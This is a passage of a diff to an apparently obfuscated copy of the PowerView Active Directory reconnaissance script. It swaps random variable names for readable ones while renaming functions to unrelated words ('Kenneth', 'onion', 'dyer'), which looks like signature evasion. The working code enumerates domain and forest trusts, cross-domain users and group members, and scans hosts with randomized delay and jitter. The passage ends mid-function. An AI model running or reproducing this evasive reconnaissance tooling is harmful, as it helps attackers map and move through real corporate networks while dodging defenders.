-                Write-Verbose "[strutting] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
-                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $SZjbzmKX99, $AlrHOHqQ99, $WUqPycDr99
+            Write-Verbose "[polite] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[polite] Delay: $Delay, Jitter: $Jitter"
+            $Counter = 0
+            $RandNo = New-Object System.Random
+            ForEach ($TargetComputer in $TargetComputers) {
+                $Counter = $Counter + 1
+                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose "[polite] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
             }
         }
         else {
-            Write-Verbose "[strutting] Using threading with threads: $wCkPnMUb99"
-            $qczwSIpm99 = @{
-                'GroupName' = $SZjbzmKX99
-                'Method' = $AlrHOHqQ99
-                'TokenHandle' = $WUqPycDr99
+            Write-Verbose "[polite] Using threading with threads: $Threads"
+            $ScriptParams = @{
+                'GroupName' = $GroupName
+                'Method' = $Method
+                'TokenHandle' = $LogonToken
             }
-            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
+            wingnut -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function cryogenics {
+function Kenneth {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.DomainTrust.NET')]
     [OutputType('PowerView.DomainTrust.LDAP')]
@@ -9539,7 +9539,7 @@ function cryogenics {
         [Alias('Name')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Parameter(ParameterSetName = 'API')]
         [Switch]
         $API,
@@ -9550,47 +9550,47 @@ function cryogenics {
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [Parameter(ParameterSetName = 'LDAP')]
         [Parameter(ParameterSetName = 'API')]
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Parameter(ParameterSetName = 'LDAP')]
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Parameter(ParameterSetName = 'LDAP')]
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $dAsLqcAM99 = @{
+        $TrustAttributes = @{
             [uint32]'0x00000001' = 'NON_TRANSITIVE'
             [uint32]'0x00000002' = 'UPLEVEL_ONLY'
             [uint32]'0x00000004' = 'FILTER_SIDS'
@@ -9603,152 +9603,152 @@ function cryogenics {
             [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
             [uint32]'0x00000400' = 'PIM_TRUST'
         }
-        $XXyZVOiE99 = @{}
-        if ($PSBoundParameters['Domain']) { $XXyZVOiE99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $XXyZVOiE99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['Properties']) { $XXyZVOiE99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $XXyZVOiE99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $XXyZVOiE99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $XXyZVOiE99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $XXyZVOiE99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $XXyZVOiE99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $XXyZVOiE99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $XXyZVOiE99['Credential'] = $gxazvivN99 }
+        $LdapSearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
     }
     PROCESS {
         if ($PsCmdlet.ParameterSetName -ne 'API') {
-            $KQThjCTH99 = @{}
-            if ($SSNUOPgW99 -and $SSNUOPgW99.Trim() -ne '') {
-                $XuRFhJVk99 = $SSNUOPgW99
+            $NetSearcherArguments = @{}
+            if ($Domain -and $Domain.Trim() -ne '') {
+                $SourceDomain = $Domain
             }
             else {
                 if ($PSBoundParameters['Credential']) {
-                    $XuRFhJVk99 = (debater -Credential $gxazvivN99).Name
+                    $SourceDomain = (southernmost -Credential $Credential).Name
                 }
                 else {
-                    $XuRFhJVk99 = (debater).Name
+                    $SourceDomain = (southernmost).Name
                 }
             }
         }
         elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
-            if ($SSNUOPgW99 -and $SSNUOPgW99.Trim() -ne '') {
-                $XuRFhJVk99 = $SSNUOPgW99
+            if ($Domain -and $Domain.Trim() -ne '') {
+                $SourceDomain = $Domain
             }
             else {
-                $XuRFhJVk99 = $Env:USERDNSDOMAIN
+                $SourceDomain = $Env:USERDNSDOMAIN
             }
         }
         if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
-            $GQnnQEfn99 = watersides @LdapSearcherArguments
-            $anzhpHHN99 = disobedience @NetSearcherArguments
-            if ($GQnnQEfn99) {
-                $GQnnQEfn99.Filter = '(objectClass=trustedDomain)'
-                if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $GQnnQEfn99.FindOne() }
-                else { $pfqXXMQd99 = $GQnnQEfn99.FindAll() }
-                $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            $TrustSearcher = deadly @LdapSearcherArguments
+            $SourceSID = reverse @NetSearcherArguments
+            if ($TrustSearcher) {
+                $TrustSearcher.Filter = '(objectClass=trustedDomain)'
+                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }
+                else { $Results = $TrustSearcher.FindAll() }
+                $Results | Where-Object {$_} | ForEach-Object {
                     $Props = $_.Properties
-                    $YCTthRKk99 = New-Object PSObject
-                    $KMfKgbQi99 = @()
-                    $KMfKgbQi99 += $dAsLqcAM99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $dAsLqcAM99[$_] }
-                    $ujzFOdNr99 = Switch ($Props.trustdirection) {
+                    $DomainTrust = New-Object PSObject
+                    $TrustAttrib = @()
+                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }
+                    $Direction = Switch ($Props.trustdirection) {
                         0 { 'Disabled' }
                         1 { 'Inbound' }
                         2 { 'Outbound' }
                         3 { 'Bidirectional' }
                     }
-                    $fHAIwgIV99 = Switch ($Props.trusttype) {
+                    $TrustType = Switch ($Props.trusttype) {
                         1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                         2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                         3 { 'MIT' }
                     }
-                    $GmeuRAOD99 = $Props.distinguishedname[0]
-                    $jHENsTaV99 = $GmeuRAOD99.IndexOf('DC=')
-                    if ($jHENsTaV99) {
-                        $XuRFhJVk99 = $($GmeuRAOD99.SubString($jHENsTaV99)) -replace 'DC=','' -replace ',','.'
+                    $Distinguishedname = $Props.distinguishedname[0]
+                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')
+                    if ($SourceNameIndex) {
+                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                     }
                     else {
-                        $XuRFhJVk99 = ""
+                        $SourceDomain = ""
                     }
-                    $ARzOsoma99 = $GmeuRAOD99.IndexOf(',CN=System')
-                    if ($jHENsTaV99) {
-                        $IayDthuO99 = $GmeuRAOD99.SubString(3, $ARzOsoma99-3)
+                    $TargetNameIndex = $Distinguishedname.IndexOf(',CN=System')
+                    if ($SourceNameIndex) {
+                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                     }
                     else {
-                        $IayDthuO99 = ""
+                        $TargetDomain = ""
                     }
-                    $vvjXjOgW99 = New-Object Guid @(,$Props.objectguid[0])
-                    $pZtebdhW99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
-                    $YCTthRKk99 | Add-Member Noteproperty 'SourceName' $XuRFhJVk99
-                    $YCTthRKk99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
-                    $YCTthRKk99 | Add-Member Noteproperty 'TrustType' $fHAIwgIV99
-                    $YCTthRKk99 | Add-Member Noteproperty 'TrustAttributes' $($KMfKgbQi99 -join ',')
-                    $YCTthRKk99 | Add-Member Noteproperty 'TrustDirection' "$ujzFOdNr99"
-                    $YCTthRKk99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
-                    $YCTthRKk99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
-                    $YCTthRKk99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
-                    $YCTthRKk99
+                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
+                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
+                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
+                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
+                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
+                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
+                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
+                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
+                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
+                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
+                    $DomainTrust
                 }
-                if ($pfqXXMQd99) {
-                    try { $pfqXXMQd99.dispose() }
+                if ($Results) {
+                    try { $Results.dispose() }
                     catch {
-                        Write-Verbose "[cryogenics] Error disposing of the Results object: $_"
+                        Write-Verbose "[Kenneth] Error disposing of the Results object: $_"
                     }
                 }
-                $GQnnQEfn99.dispose()
+                $TrustSearcher.dispose()
             }
         }
         elseif ($PsCmdlet.ParameterSetName -eq 'API') {
             if ($PSBoundParameters['Server']) {
-                $gmvsdZjZ99 = $mSxqoOjK99
+                $TargetDC = $Server
             }
-            elseif ($SSNUOPgW99 -and $SSNUOPgW99.Trim() -ne '') {
-                $gmvsdZjZ99 = $SSNUOPgW99
+            elseif ($Domain -and $Domain.Trim() -ne '') {
+                $TargetDC = $Domain
             }
             else {
-                $gmvsdZjZ99 = $Null
+                $TargetDC = $Null
             }
-            $TuHFtCTR99 = [IntPtr]::Zero
+            $PtrInfo = [IntPtr]::Zero
             $Flags = 63
-            $QccMrSGE99 = 0
-            $fYOedlSN99 = $eIekXKWj99::DsEnumerateDomainTrusts($gmvsdZjZ99, $Flags, [ref]$TuHFtCTR99, [ref]$QccMrSGE99)
-            $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
-            if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
-                $TYJIVmOK99 = $ZELCewrO99::GetSize()
-                for ($i = 0; ($i -lt $QccMrSGE99); $i++) {
-                    $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
-                    $Info = $UeHktdvI99 -as $ZELCewrO99
-                    $KUsFrgdb99 = $UeHktdvI99.ToInt64()
-                    $KUsFrgdb99 += $TYJIVmOK99
-                    $LheQlAxo99 = ''
-                    $fYOedlSN99 = $hVuDLVbw99::ConvertSidToStringSid($Info.DomainSid, [ref]$LheQlAxo99);$HWqgzfQS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                    if ($fYOedlSN99 -eq 0) {
-                        Write-Verbose "[cryogenics] Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
+            $DomainCount = 0
+            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)
+            $Offset = $PtrInfo.ToInt64()
+            if (($Result -eq 0) -and ($Offset -gt 0)) {
+                $Increment = $DS_DOMAIN_TRUSTS::GetSize()
+                for ($i = 0; ($i -lt $DomainCount); $i++) {
+                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS
+                    $Offset = $NewIntPtr.ToInt64()
+                    $Offset += $Increment
+                    $SidString = ''
+                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    if ($Result -eq 0) {
+                        Write-Verbose "[Kenneth] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                     }
                     else {
-                        $YCTthRKk99 = New-Object PSObject
-                        $YCTthRKk99 | Add-Member Noteproperty 'SourceName' $XuRFhJVk99
-                        $YCTthRKk99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
-                        $YCTthRKk99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
-                        $YCTthRKk99 | Add-Member Noteproperty 'Flags' $Info.Flags
-                        $YCTthRKk99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
-                        $YCTthRKk99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
-                        $YCTthRKk99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
-                        $YCTthRKk99 | Add-Member Noteproperty 'TargetSid' $LheQlAxo99
-                        $YCTthRKk99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
-                        $YCTthRKk99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
-                        $YCTthRKk99
+                        $DomainTrust = New-Object PSObject
+                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
+                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
+                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
+                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
+                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
+                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
+                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
+                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
+                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
+                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
+                        $DomainTrust
                     }
                 }
-                $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
+                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose "[cryogenics] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
+                Write-Verbose "[Kenneth] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
             }
         }
         else {
-            $jAPRADZj99 = debater @NetSearcherArguments
-            if ($jAPRADZj99) {
-                $jAPRADZj99.GetAllTrustRelationships() | ForEach-Object {
+            $FoundDomain = southernmost @NetSearcherArguments
+            if ($FoundDomain) {
+                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                     $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                     $_
                 }
@@ -9756,7 +9756,7 @@ function cryogenics {
         }
     }
 }
-function victory {
+function onion {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ForestTrust.NET')]
     [CmdletBinding()]
@@ -9765,25 +9765,25 @@ function victory {
         [Alias('Name')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $ZKthMMjt99,
+        $Forest,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        $RYyNPlEK99 = @{}
-        if ($PSBoundParameters['Forest']) { $RYyNPlEK99['Forest'] = $ZKthMMjt99 }
-        if ($PSBoundParameters['Credential']) { $RYyNPlEK99['Credential'] = $gxazvivN99 }
-        $ufraWpfu99 = ampere @NetForestArguments
-        if ($ufraWpfu99) {
-            $ufraWpfu99.GetAllTrustRelationships() | ForEach-Object {
+        $NetForestArguments = @{}
+        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }
+        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }
+        $FoundForest = chicaneries @NetForestArguments
+        if ($FoundForest) {
+            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                 $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                 $_
             }
         }
     }
 }
-function Syrians {
+function dyer {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ForeignUser')]
     [CmdletBinding()]
@@ -9792,82 +9792,82 @@ function Syrians {
         [Alias('Name')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{}
-        $PPosolen99['LDAPFilter'] = '(memberof=*)'
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        if ($PSBoundParameters['Raw']) { $PPosolen99['Raw'] = $Raw }
+        $SearcherArguments = @{}
+        $SearcherArguments['LDAPFilter'] = '(memberof=*)'
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
     }
     PROCESS {
-        township @SearcherArguments  | ForEach-Object {
-            ForEach ($AjSokHtI99 in $_.memberof) {
-                $Index = $AjSokHtI99.IndexOf('DC=')
+        prissier @SearcherArguments  | ForEach-Object {
+            ForEach ($Membership in $_.memberof) {
+                $Index = $Membership.IndexOf('DC=')
                 if ($Index) {
-                    $BBaSdAsr99 = $($AjSokHtI99.SubString($Index)) -replace 'DC=','' -replace ',','.'
-                    $ECdAeYIK99 = $_.distinguishedname
-                    $YgxTjQeQ99 = $ECdAeYIK99.IndexOf('DC=')
-                    $ojqqfkye99 = $($_.distinguishedname.SubString($YgxTjQeQ99)) -replace 'DC=','' -replace ',','.'
-                    if ($BBaSdAsr99 -ne $ojqqfkye99) {
-                        $SZjbzmKX99 = $AjSokHtI99.Split(',')[0].split('=')[1]
-                        $XRKpBIRs99 = New-Object PSObject
-                        $XRKpBIRs99 | Add-Member Noteproperty 'UserDomain' $ojqqfkye99
-                        $XRKpBIRs99 | Add-Member Noteproperty 'UserName' $_.samaccountname
-                        $XRKpBIRs99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
-                        $XRKpBIRs99 | Add-Member Noteproperty 'GroupDomain' $BBaSdAsr99
-                        $XRKpBIRs99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
-                        $XRKpBIRs99 | Add-Member Noteproperty 'GroupDistinguishedName' $AjSokHtI99
-                        $XRKpBIRs99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
-                        $XRKpBIRs99
+                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'
+                    $UserDistinguishedName = $_.distinguishedname
+                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')
+                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'
+                    if ($GroupDomain -ne $UserDomain) {
+                        $GroupName = $Membership.Split(',')[0].split('=')[1]
+                        $ForeignUser = New-Object PSObject
+                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain
+                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
+                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
+                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
+                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
+                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership
+                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
+                        $ForeignUser
                     }
                 }
             }
         }
     }
 }
-function Poiret {
+function electroencephalograph {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ForeignGroupMember')]
     [CmdletBinding()]
@@ -9876,81 +9876,81 @@ function Poiret {
         [Alias('Name')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{}
-        $PPosolen99['LDAPFilter'] = '(member=*)'
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        if ($PSBoundParameters['Raw']) { $PPosolen99['Raw'] = $Raw }
+        $SearcherArguments = @{}
+        $SearcherArguments['LDAPFilter'] = '(member=*)'
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
     }
     PROCESS {
-        $zGCYpqeW99 = @('Users', 'Domain Users', 'Guests')
-        burlap @SearcherArguments | Where-Object { $zGCYpqeW99 -notcontains $_.samaccountname } | ForEach-Object {
-            $SZjbzmKX99 = $_.samAccountName
-            $puEJpQFm99 = $_.distinguishedname
